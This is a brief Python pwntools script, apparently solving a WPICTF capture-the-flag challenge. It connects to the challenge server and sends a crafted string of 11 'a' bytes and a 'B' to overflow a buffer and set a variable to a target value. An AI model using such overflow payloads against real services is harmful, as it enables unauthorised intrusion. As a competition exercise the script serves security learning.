from pwn import *

r = remote('smash184384.wpictf.xyz', 15724)

# 0x37130042
r.sendline('a'*11+'B') # this will insert \x42 and \x00
print(r.recv())
